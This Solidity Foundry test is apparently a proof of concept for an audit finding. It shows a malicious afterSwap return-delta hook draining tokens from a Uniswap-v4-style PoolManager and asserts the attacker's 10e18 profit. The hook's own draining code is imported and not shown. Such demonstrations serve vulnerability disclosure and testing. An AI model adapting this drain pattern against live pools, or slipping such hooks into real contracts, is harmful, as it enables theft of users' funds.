// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";

contract Token {
    mapping(address=>uint) public balanceOf;
    function mint(address t,uint a) external {balanceOf[t]+=a;}
    function transfer(address t,uint a) external returns(bool){balanceOf[msg.sender]-=a; balanceOf[t]+=a; return true;}
    function transferFrom(address f,address t,uint a) external returns(bool){balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function approve(address,uint) external pure returns(bool){return true;}
}

contract POC is Test {
    PoolManager public manager;
    MaliciousDeltaHook public hook;
    Token public token0; Token public token1;
    PoolKey public key;
    bool isAddingLiquidity;

    function setUp() public {
        Token t0=new Token(); Token t1=new Token();
        if(address(t0)>address(t1)){Token tmp=t0; t0=t1; t1=tmp;}
        token0=t0; token1=t1;
        manager=new PoolManager(address(this));
        uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
        vm.etch(a, address(new MaliciousDeltaHook(address(manager))).code);
        hook=MaliciousDeltaHook(a);
        token0.mint(address(this),100e18); token1.mint(address(this),100e18);
        token0.mint(address(manager),100e18); token1.mint(address(manager),100e18);
        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
        hook.setCurrency1(Currency.wrap(address(token1)));
        hook.setAttacker(address(this));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
        isAddingLiquidity=true;
        manager.unlock("");
        isAddingLiquidity=false;
    }

    function unlockCallback(bytes calldata) external returns(bytes memory){
        if(isAddingLiquidity){
            BalanceDelta delta=manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
            if(delta.amount0()<0) manager.settle(Currency.wrap(address(token0)));
            if(delta.amount1()<0) manager.settle(Currency.wrap(address(token1)));
            if(delta.amount0()>0) manager.take(Currency.wrap(address(token0)), address(this), uint128(delta.amount0()));
            if(delta.amount1()>0) manager.take(Currency.wrap(address(token1)), address(this), uint128(delta.amount1()));
        }else{
            manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
            hook.drain(10e18);
        }
        return "";
    }

    function test_afterSwapReturnDelta() public {
        uint bBefore=token1.balanceOf(address(manager));
        manager.unlock("");
        uint bAfter=token1.balanceOf(address(manager));
        uint profit=token1.balanceOf(address(this));
        console.log("Loss",bBefore-bAfter);
        console.log("Profit",profit);
        assertLt(bAfter,bBefore);
        assertEq(profit,10e18);
    }
}